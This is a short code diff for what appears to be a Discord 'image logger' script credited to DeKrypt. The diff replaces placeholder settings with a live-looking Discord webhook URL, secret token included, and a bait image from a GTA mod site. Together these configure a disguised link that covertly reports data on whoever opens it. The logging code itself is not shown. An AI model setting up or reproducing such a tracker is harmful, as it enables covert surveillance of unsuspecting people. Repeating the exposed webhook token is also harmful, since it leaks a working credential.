@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335228792737628170/tIWH7zpYFiuSUX0x9NbYZIkSUuwk3UFT2Lirlt_S5FK5ymYSk8uftqFtO2pJyqyDBypq",
+    "image": "https://img.gta5-mods.com/q95/images/gang-sign-animations-sp-fivem/c365d5-jwgangsign2.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
